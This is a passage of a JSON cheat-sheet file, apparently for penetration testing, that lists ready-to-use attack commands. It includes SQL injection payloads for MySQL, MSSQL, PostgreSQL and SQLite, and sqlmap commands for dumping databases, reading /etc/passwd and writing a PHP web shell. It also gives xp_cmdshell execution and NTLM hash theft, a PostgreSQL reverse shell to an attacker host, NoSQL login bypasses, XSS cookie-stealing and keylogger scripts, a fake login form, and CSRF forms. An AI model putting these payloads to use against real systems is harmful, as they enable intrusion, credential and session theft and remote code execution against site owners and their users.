            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- -\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "MySQL Double Query Error",
            "desc": "Error-based extraction via double query",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "MSSQL Convert Error",
            "desc": "Extract data via CONVERT type error",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND 1=CONVERT(int,(SELECT @@version))-- -\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "PostgreSQL Cast Error",
            "desc": "Extract data via CAST type error",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND 1=CAST((SELECT version()) AS int)-- -\"",
            "tags": [
              "advanced"
            ]
          }
        ]
      },
      {
        "name": "Blind Boolean Extraction",
        "commands": [
          {
            "title": "Boolean Blind Version (MySQL)",
            "desc": "Extract version character by character",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND SUBSTRING(@@version,1,1)='5'-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Boolean Blind Database Length",
            "desc": "Determine database name length",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND LENGTH(database())=<NUM>-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Boolean Blind Database Name",
            "desc": "Extract database name one character at a time",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND SUBSTRING(database(),<POS>,1)='<CHAR>'-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Boolean Blind Table Count",
            "desc": "Count tables in current database",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=<NUM>-- -\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Boolean Blind ASCII Extract",
            "desc": "Extract character via ASCII comparison",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- -\"",
            "tags": [
              "advanced"
            ],
            "note": "Binary search for each character: narrow between 32-127"
          }
        ]
      },
      {
        "name": "Blind Time-Based Extraction",
        "commands": [
          {
            "title": "MySQL Time Blind Version",
            "desc": "Time-based version extraction",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(3),0)-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MySQL Time Blind Database",
            "desc": "Time-based database name extraction",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MSSQL Time Blind",
            "desc": "Time-based extraction on MSSQL",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1'; IF(SUBSTRING(@@version,1,1)='M') WAITFOR DELAY '0:0:3'-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PostgreSQL Time Blind",
            "desc": "Time-based extraction on PostgreSQL",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1'; SELECT CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(3) ELSE pg_sleep(0) END-- -\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SQLite Time Blind (Heavy Query)",
            "desc": "Time-based extraction on SQLite via heavy query",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND CASE WHEN (SUBSTR((SELECT sqlite_version()),1,1)='3') THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 1 END-- -\"",
            "tags": [
              "advanced"
            ]
          }
        ]
      },
      {
        "name": "SQLMap Automation",
        "commands": [
          {
            "title": "SQLMap Basic GET",
            "desc": "Basic SQLi detection on GET parameter",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --batch",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "SQLMap POST Request",
            "desc": "Test POST parameters for SQLi",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page' --data 'user=admin&pass=test' --batch",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "SQLMap with Cookie",
            "desc": "Test with session cookie",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --cookie='session=<COOKIE>' --batch",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "SQLMap from Request File",
            "desc": "Use saved Burp request file",
            "cmd": "sqlmap -r request.txt --batch",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Save request from Burp: Right-click > Save Item"
          },
          {
            "title": "SQLMap Enumerate Databases",
            "desc": "List all databases",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --dbs --batch",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "SQLMap Enumerate Tables",
            "desc": "List tables in a database",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' -D <DATABASE> --tables --batch",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "SQLMap Enumerate Columns",
            "desc": "List columns in a table",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' -D <DATABASE> -T <TABLE> --columns --batch",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "SQLMap Dump Table",
            "desc": "Dump data from a table",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' -D <DATABASE> -T <TABLE> -C <COL1>,<COL2> --dump --batch",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "SQLMap OS Shell",
            "desc": "Get an interactive OS shell via SQLi",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --os-shell --batch",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "SQLMap File Read",
            "desc": "Read file from target filesystem",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --file-read='/etc/passwd' --batch",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "SQLMap File Write",
            "desc": "Write file to target filesystem",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --file-write='shell.php' --file-dest='/var/www/html/shell.php' --batch",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "SQLMap Specify Technique",
            "desc": "Use specific injection techniques",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --technique=BEUST --batch",
            "tags": [
              "tool"
            ],
            "note": "B=Boolean, E=Error, U=Union, S=Stacked, T=Time"
          },
          {
            "title": "SQLMap with Tamper Script",
            "desc": "Use tamper scripts to bypass WAF",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=space2comment,between --batch",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "SQLMap High Risk/Level",
            "desc": "Maximum injection testing intensity",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --risk=3 --level=5 --batch",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "SQLMap Specific DBMS",
            "desc": "Target a specific database type",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --dbms=mysql --batch",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "SQLMap Dump All",
            "desc": "Dump entire database",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' -D <DATABASE> --dump-all --batch",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "SQLMap Tamper space2comment",
            "desc": "Replace spaces with comments to bypass WAF",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=space2comment --batch",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "SQLMap Tamper charencode",
            "desc": "URL-encode characters to bypass WAF",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=charencode --batch",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "SQLMap Tamper randomcase",
            "desc": "Randomize SQL keyword case to bypass WAF",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=randomcase --batch",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "SQLMap Tamper between",
            "desc": "Replace > with BETWEEN to bypass WAF",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=between --batch",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "SQLMap Tamper Chain (WAF Bypass)",
            "desc": "Chain multiple tamper scripts for aggressive WAF bypass",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=space2comment,randomcase,charencode,between --batch --level=5 --risk=3",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "SQLMap Second-Order SQLi",
            "desc": "Test second-order injection via separate request",
            "cmd": "sqlmap -r inject_request.txt --second-req trigger_request.txt --batch",
            "tags": [
              "advanced",
              "tool"
            ],
            "note": "inject_request.txt stores payload, trigger_request.txt retrieves output"
          },
          {
            "title": "SQLMap with Proxy (Burp)",
            "desc": "Route SQLMap through Burp for inspection",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --proxy=http://127.0.0.1:8080 --batch",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "SQLMap Custom Injection Point",
            "desc": "Mark custom injection point in request",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1*' --batch",
            "tags": [
              "tool"
            ],
            "note": "Use * to mark the injection point"
          },
          {
            "title": "SQLMap Multi Tampers",
            "desc": "Chain tamper scripts",
            "cmd": "sqlmap -u '<URL>?id=1' --tamper=space2comment,randomcase,charencode --batch --dbs",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SQLMap via Proxy",
            "desc": "Route through proxy",
            "cmd": "sqlmap -u '<URL>?id=1' --proxy=http://127.0.0.1:8080 --batch --dbs",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "SQLMap Risk/Level",
            "desc": "Max detection sensitivity",
            "cmd": "sqlmap -u '<URL>?id=1' --risk=3 --level=5 --batch --dbs",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SQLMap Random Agent",
            "desc": "Randomize User-Agent",
            "cmd": "sqlmap -u '<URL>?id=1' --random-agent --batch --dbs",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "SQLMap Second-Order",
            "desc": "Second-order SQLi test",
            "cmd": "sqlmap -u '<URL>/register' --data='user=test&pass=test' --second-url='<URL>/profile' --batch --dbs",
            "tags": [
              "advanced"
            ]
          }
        ]
      },
      {
        "name": "MSSQL Techniques",
        "commands": [
          {
            "title": "MSSQL Enable xp_cmdshell",
            "desc": "Enable xp_cmdshell for OS command execution",
            "cmds": [
              "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
              "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
            ],
            "tags": [
              "essential"
            ],
            "note": "Requires sysadmin privileges"
          },
          {
            "title": "MSSQL Execute Command",
            "desc": "Execute OS command via xp_cmdshell",
            "cmd": "EXEC xp_cmdshell 'whoami';",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MSSQL Steal Hash (xp_dirtree)",
            "desc": "Force NTLM authentication to attacker SMB share",
            "cmd": "EXEC xp_dirtree '\\\\<ATTACKER_IP>\\share';",
            "tags": [
              "essential"
            ],
            "note": "Catch hash with responder or smbserver"
          },
          {
            "title": "MSSQL Steal Hash (xp_subdirs)",
            "desc": "Alternative NTLM hash theft",
            "cmd": "EXEC xp_subdirs '\\\\<ATTACKER_IP>\\share';",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MSSQL OPENROWSET Hash Steal",
            "desc": "Force auth via OPENROWSET",
            "cmd": "SELECT * FROM OPENROWSET('SQLOLEDB','Server=<ATTACKER_IP>;uid=sa;pwd=whatever','SELECT 1');",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "MSSQL Linked Servers",
            "desc": "Enumerate linked servers for lateral movement",
            "cmd": "SELECT * FROM sys.servers;",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "MSSQL Impersonate Users",
            "desc": "Check which users can be impersonated",
            "cmd": "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';",
            "tags": [
              "advanced"
            ]
          }
        ]
      },
      {
        "name": "PostgreSQL Techniques",
        "commands": [
          {
            "title": "PostgreSQL Read File",
            "desc": "Read files from filesystem",
            "cmd": "SELECT pg_read_file('/etc/passwd');",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PostgreSQL COPY TO File",
            "desc": "Write data to a file",
            "cmd": "COPY (SELECT '<?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php';",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "PostgreSQL COPY FROM File",
            "desc": "Read file into a table",
            "cmd": "CREATE TABLE tmp(data text); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PostgreSQL Command Execution",
            "desc": "Execute OS commands via COPY PROGRAM",
            "cmd": "COPY (SELECT '') TO PROGRAM 'id';",
            "tags": [
              "advanced"
            ],
            "note": "Requires superuser privileges"
          },
          {
            "title": "PostgreSQL Large Object RCE",
            "desc": "RCE via large objects and lo_export",
            "cmds": [
              "SELECT lo_import('/etc/passwd');",
              "SELECT lo_export(<LOID>, '/tmp/out');"
            ],
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "PostgreSQL Current User & Roles",
            "desc": "Check current user and role memberships",
            "cmd": "SELECT current_user, current_setting('is_superuser');",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PostgreSQL List Users & Roles",
            "desc": "Enumerate all database users and roles",
            "cmd": "SELECT usename, usecreatedb, usesuper FROM pg_user;",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PostgreSQL UDF Command Execution",
            "desc": "Create a function for OS command execution",
            "cmds": [
              "CREATE OR REPLACE FUNCTION cmd(text) RETURNS text AS $$ import os; return os.popen(args[0]).read() $$ LANGUAGE plpythonu;",
              "SELECT cmd('id');"
            ],
            "tags": [
              "advanced"
            ],
            "note": "Requires plpythonu extension"
          },
          {
            "title": "PostgreSQL Reverse Shell",
            "desc": "Reverse shell via COPY PROGRAM",
            "cmd": "COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\"';",
            "tags": [
              "advanced"
            ]
          }
        ]
      },
      {
        "name": "NoSQL Injection",
        "commands": [
          {
            "title": "MongoDB Auth Bypass ($ne)",
            "desc": "Bypass login with $ne operator",
            "cmd": "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MongoDB Auth Bypass ($gt)",
            "desc": "Bypass login with $gt operator",
            "cmd": "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MongoDB Regex Extraction",
            "desc": "Extract data character by character via $regex",
            "cmd": "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}}'",
            "tags": [
              "essential"
            ],
            "note": "Iterate characters: ^a, ^ab, ^abc... until match found"
          },
          {
            "title": "MongoDB $where JavaScript Injection",
            "desc": "Inject JavaScript in $where operator",
            "cmd": "curl -X POST http://<TARGET_IP>/search -H 'Content-Type: application/json' -d '{\"$where\":\"this.username == \\\"admin\\\" && this.password.match(/^a.*/)\"}' ",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "NoSQL Injection via URL Params",
            "desc": "NoSQL injection through URL-encoded parameters",
            "cmd": "curl 'http://<TARGET_IP>/login?username=admin&password[$ne]=wrong'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "NoSQL Regex Password Extraction",
            "desc": "Extract password length then chars via regex",
            "cmds": [
              "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$regex\":\".{5}\"}}'",
              "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}}'"
            ],
            "tags": [
              "advanced"
            ],
            "note": "First find length, then brute force each character"
          },
          {
            "title": "NoSQLMap Automated Testing",
            "desc": "Automated NoSQL injection scanner",
            "cmd": "python nosqlmap.py -u http://<TARGET_IP>/login --data 'username=admin&password=test'",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "MongoDB $in Operator Injection",
            "desc": "Use $in to test multiple values at once",
            "cmd": "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":{\"$in\":[\"admin\",\"root\",\"administrator\"]},\"password\":{\"$ne\":\"\"}}'",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "NoSQL Auth Bypass $ne",
            "desc": "Bypass login with $ne",
            "cmd": "curl -X POST <URL>/login -H 'Content-Type: application/json' -d '{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "NoSQL $regex Bypass",
            "desc": "Regex auth bypass",
            "cmd": "curl -X POST <URL>/login -H 'Content-Type: application/json' -d '{\"username\":{\"$regex\":\"^admin\"},\"password\":{\"$ne\":\"\"}}'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "NoSQL URL Params",
            "desc": "Inject via URL brackets",
            "cmd": "curl '<URL>/login?username[$ne]=x&password[$ne]=x'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "NoSQLMap",
            "desc": "Automated NoSQL injection",
            "cmd": "python3 nosqlmap.py -u <URL> --attack 1",
            "tags": [
              "tool"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "xss-csrf",
    "name": "Browser-Side Exploitation",
    "icon": "📜",
    "description": "Exploit cross-site scripting, cross-site request forgery, and DOM-based vulnerabilities to attack users and their browsers.",
    "subcategories": [
      {
        "name": "XSS Detection Payloads",
        "commands": [
          {
            "title": "XSS Basic Script Tag",
            "desc": "Classic script tag injection",
            "cmd": "<script>alert('XSS')</script>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "XSS IMG Onerror",
            "desc": "XSS via broken image error handler",
            "cmd": "<img src=x onerror=alert('XSS')>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "XSS SVG Onload",
            "desc": "XSS via SVG onload event",
            "cmd": "<svg onload=alert('XSS')>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "XSS Body Onload",
            "desc": "XSS via body onload event",
            "cmd": "<body onload=alert('XSS')>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "XSS Input Onfocus",
            "desc": "XSS via input autofocus",
            "cmd": "<input onfocus=alert('XSS') autofocus>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "XSS Details Tag",
            "desc": "XSS via details/summary toggle",
            "cmd": "<details open ontoggle=alert('XSS')>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "XSS Marquee Tag",
            "desc": "XSS via marquee event",
            "cmd": "<marquee onstart=alert('XSS')>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "XSS Iframe Injection",
            "desc": "XSS via iframe srcdoc",
            "cmd": "<iframe srcdoc='<script>alert(1)</script>'>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "XSS Event Handler List",
            "desc": "Common event handlers for XSS",
            "cmds": [
              "<div onmouseover=alert('XSS')>hover me</div>",
              "<a href=javascript:alert('XSS')>click</a>",
              "<select onfocus=alert('XSS') autofocus>",
              "<textarea onfocus=alert('XSS') autofocus>",
              "<video><source onerror=alert('XSS')>"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "XSS Polyglot Payload",
            "desc": "Universal XSS polyglot that works in multiple contexts",
            "cmd": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik'telerik\"telerik>telerik<teleriktel eriktel erike rik/teleriktel erike rik\\telerika]telerikb]telerik}telerikb}telerik|telerikb|telerik&telerikb&telerik&&telerikb&&telerikp]telerikb]telerik}telerikb}",
            "tags": [
              "advanced"
            ],
            "note": "Shortened version: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert())//"
          },
          {
            "title": "XSS Polyglot",
            "desc": "Universal XSS payload",
            "cmd": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0telerik0telerik11-<telerik\"><svg/onload=alert()//>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Blind XSS",
            "desc": "Out-of-band detection",
            "cmd": "'><script src=http://<ATTACKER_IP>/xss.js></script>",
            "tags": [
              "essential"
            ],
            "note": "Host JS that callbacks to your server"
          },
          {
            "title": "XSS SVG Upload",
            "desc": "XSS via SVG file",
            "cmd": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('XSS')\"><circle r=\"50\"/></svg>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "XSS Event Handlers Extended",
            "desc": "Less common event handlers",
            "cmds": [
              "<marquee onstart=alert(1)>",
              "<video src=x onerror=alert(1)>",
              "<audio src=x onerror=alert(1)>",
              "<object data=javascript:alert(1)>",
              "<body onpageshow=alert(1)>"
            ],
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Session Hijacking",
        "commands": [
          {
            "title": "XSS Cookie Steal (Image)",
            "desc": "Steal cookies via Image object",
            "cmd": "<script>new Image().src='http://<ATTACKER_IP>/steal?c='+document.cookie;</script>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "XSS Cookie Steal (Fetch)",
            "desc": "Steal cookies via fetch API",
            "cmd": "<script>fetch('http://<ATTACKER_IP>/steal?c='+document.cookie)</script>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "XSS Cookie Steal (XMLHttpRequest)",
            "desc": "Steal cookies via XHR",
            "cmd": "<script>var x=new XMLHttpRequest();x.open('GET','http://<ATTACKER_IP>/steal?c='+document.cookie);x.send();</script>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "XSS Keylogger Injection",
            "desc": "Inject keylogger to capture input",
            "cmd": "<script>document.onkeypress=function(e){new Image().src='http://<ATTACKER_IP>/log?k='+e.key;}</script>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "XSS Phishing Login Form",
            "desc": "Inject fake login form to steal creds",
            "cmd": "<script>document.body.innerHTML='<h2>Session Expired</h2><form action=http://<ATTACKER_IP>/phish method=POST><input name=user placeholder=Username><input name=pass type=password placeholder=Password><input type=submit value=Login></form>';</script>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "XSS Redirect to Attacker",
            "desc": "Redirect victim to attacker-controlled page",
            "cmd": "<script>window.location='http://<ATTACKER_IP>/steal?c='+document.cookie</script>",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Filter Evasion",
        "commands": [
          {
            "title": "XSS HTML Entity Encoding",
            "desc": "Bypass filters using HTML entities",
            "cmd": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "XSS URL Encoding",
            "desc": "Bypass WAF with URL-encoded payload",
            "cmd": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "XSS Double URL Encoding",
            "desc": "Double-encode to bypass two layers of filtering",
            "cmd": "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "XSS Unicode Encoding",
            "desc": "Unicode escape for JavaScript execution",
            "cmd": "<script>\\u0061lert(1)</script>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "XSS Case Variation",
            "desc": "Bypass case-sensitive filters",
            "cmd": "<ScRiPt>alert(1)</sCrIpT>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "XSS Null Byte Injection",
            "desc": "Bypass filters with null byte",
            "cmd": "<scr%00ipt>alert(1)</scr%00ipt>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "XSS No Parentheses",
            "desc": "XSS without using parentheses",
            "cmd": "<script>alert`1`</script>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "XSS No Quotes or Slashes",
            "desc": "Payload avoiding quotes and slashes",
            "cmd": "<svg onload=alert(String.fromCharCode(88,83,83))>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "XSS Script Tag Variations",
            "desc": "Alternative script injection methods",
            "cmds": [
              "<script/src=http://<ATTACKER_IP>/xss.js>",
              "<script x>alert(1)</script>",
              "<script>/**/alert(1)/**/</script>"
            ],
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "XSS via JavaScript Protocol",
            "desc": "Inject via javascript: pseudo-protocol",
            "cmd": "<a href='javascript:alert(1)'>click</a>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "CSP Bypass JSONP",
            "desc": "Bypass CSP via JSONP",
            "cmd": "<script src='https://allowed-cdn.com/jsonp?callback=alert(1)'></script>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "CSP Bypass base-uri",
            "desc": "Change base URI",
            "cmd": "<base href='http://<ATTACKER_IP>/'>",
            "tags": [
              "advanced"
            ]
          }
        ]
      },
      {
        "name": "DOM-Based Vectors",
        "commands": [
          {
            "title": "DOM XSS via location.hash",
            "desc": "Inject via URL fragment",
            "cmd": "http://<TARGET_IP>/page#<img src=x onerror=alert(1)>",
            "tags": [
              "essential"
            ],
            "note": "Vulnerable if page reads location.hash and writes to DOM"
          },
          {
            "title": "DOM XSS via document.write",
            "desc": "Exploit document.write with user input",
            "cmd": "http://<TARGET_IP>/page?name=<script>alert(1)</script>",
            "tags": [
              "essential"
            ],
            "note": "Vulnerable if: document.write(location.search)"
          },
          {
            "title": "DOM XSS via innerHTML",
            "desc": "Exploit innerHTML assignment with user input",
            "cmd": "http://<TARGET_IP>/page?msg=<img src=x onerror=alert(1)>",
            "tags": [
              "essential"
            ],
            "note": "Script tags don't execute via innerHTML, use event handlers"
          },
          {
            "title": "DOM XSS via eval()",
            "desc": "Exploit eval with user-controlled input",
            "cmd": "http://<TARGET_IP>/page?input=alert(1)",
            "tags": [
              "advanced"
            ],
            "note": "Vulnerable if: eval(userInput)"
          },
          {
            "title": "DOM XSS via postMessage",
            "desc": "Exploit insecure postMessage handlers",
            "cmd": "<script>window.frames[0].postMessage('<img src=x onerror=alert(1)>','*');</script>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "DOM Clobbering",
            "desc": "Override DOM properties via element injection",
            "cmd": "<form id=x><input name=y value=overwritten></form>",
            "tags": [
              "advanced"
            ],
            "note": "Accesses x.y returns 'overwritten' instead of expected value"
          }
        ]
      },
      {
        "name": "CSRF Techniques",
        "commands": [
          {
            "title": "CSRF Auto-Submit Form (GET)",
            "desc": "Auto-submit GET request on page load",
            "cmd": "<img src='http://<TARGET_IP>/admin/delete?id=1'>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "CSRF Auto-Submit Form (POST)",
            "desc": "Auto-submit POST form on page load",
            "cmd": "<html><body onload='document.forms[0].submit()'><form action='http://<TARGET_IP>/admin/change-email' method='POST'><input name='email' value='attacker@evil.com'></form></body></html>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "CSRF Password Change",
            "desc": "CSRF to change victim password",
            "cmd": "<html><body onload='document.forms[0].submit()'><form action='http://<TARGET_IP>/change-password' method='POST'><input name='new_password' value='hacked123'><input name='confirm_password' value='hacked123'></form></body></html>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "CSRF via XHR",
            "desc": "CSRF using XMLHttpRequest from XSS",
            "cmd": "<script>var x=new XMLHttpRequest();x.open('POST','http://<TARGET_IP>/admin/adduser');x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');x.send('user=hacker&pass=hacker&role=admin');</script>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "CSRF via Fetch API",
            "desc": "CSRF using fetch from XSS context",
            "cmd": "<script>fetch('http://<TARGET_IP>/api/update',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'})})</script>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "CSRF Token Bypass (Remove)",
            "desc": "Test if CSRF token is actually validated",
            "cmd": "<form action='http://<TARGET_IP>/action' method='POST'><input name='param' value='evil'></form>",
            "tags": [
              "essential"
            ],
            "note": "Omit the CSRF token entirely — some apps don't validate its absence"
          },
          {
            "title": "CSRF Token Bypass (Same for All)",
            "desc": "Reuse a previously captured CSRF token",
            "cmd": "<form action='http://<TARGET_IP>/action' method='POST'><input name='csrf' value='<CAPTURED_TOKEN>'><input name='param' value='evil'></form>",
            "tags": [
              "advanced"
            ],
            "note": "Some apps issue tokens but don't tie them to sessions"
          },
          {
            "title": "CSRF fetch()",
            "desc": "CSRF via fetch API",
            "cmd": "<script>fetch('<URL>/change-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@evil.com'})</script>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "CSRF Auto-Submit Form",
            "desc": "Auto-submit HTML form",
            "cmd": "<form action='<URL>/transfer' method='POST'><input name='to' value='attacker'><input name='amount' value='10000'></form><script>document.forms[0].submit()</script>",
            "tags": [
              "essential"
            ]
